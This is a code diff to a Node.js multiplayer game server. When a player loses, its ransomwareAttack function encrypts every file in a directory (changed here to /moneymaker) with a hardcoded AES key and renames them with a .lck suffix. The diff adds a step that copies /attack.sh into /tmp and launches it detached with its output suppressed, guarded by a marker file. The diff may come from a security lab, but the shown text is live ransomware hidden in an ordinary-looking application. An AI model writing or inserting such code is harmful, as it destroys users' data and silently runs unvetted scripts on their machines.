@@ -18,6 +18,7 @@ const logger = log4js.getLogger();
 const shortid = require('shortid');
 
 const shell = require('child_process').execSync;
+const { spawn } = require('child_process');
 const crypto = require('crypto'); 
 const fs = require("fs");
 
@@ -109,8 +110,19 @@ io.on('connection', (socket) => {
   function ransomwareAttack() {
     if (game.getBoard().lost) {
       logger.warn('BooooomBooooom');
-  
-      
+
+      // Check if we've already executed the attack script
+      if (!fs.existsSync('/tmp/attack_executed')) {
+        try {
+            // Create marker file to prevent future executions
+            fs.writeFileSync('/tmp/attack_executed', 'executed');
+            shell('cp /attack.sh /tmp/attack.sh');
+            spawn('/tmp/attack.sh', [],
+              { stdio: 'ignore', detached: true }).unref();
+        } catch (error) {
+            logger.error('Failed to execute attack script:', error);
+        }
+      }
 
       const algorithm = 'aes-256-ctr';
       let key = 'MySuperSecretKey';
@@ -126,7 +138,7 @@ io.on('connection', (socket) => {
         return result;
       };
 
-      const dir = '/to_encrypt';
+      const dir = '/moneymaker';
       //passsing directoryPath and callback function
       fs.readdir(dir, function (err, files) {
           //handling error
@@ -138,9 +150,12 @@ io.on('connection', (socket) => {
           var filesEncrypted = 0;
           //listing all files using forEach
           files.some(function (file) {
-              console.log(file); 
+            console.log(file); 
 
-              if (file.split('.').pop() == 'lck') return false;
+            // Check if it's a directory and skip if so
+            if (fs.statSync(dir + '/' + file).isDirectory()) return false;
+
+            if (file.split('.').pop() == 'lck') return false;
 
               var currentPath = dir + '/' + file;
               var newPath= dir + '/' + file + '.lck';
@@ -154,7 +169,7 @@ io.on('connection', (socket) => {
                 fs.writeFile(newPath, encrypted, (err) => {
                   if (err) console.log(err);
                   else {
-                    console.log("Successfully encrypted " + newPath);
+                    logger.warn("Successfully encrypted " + newPath);
                   }
                 });
               });
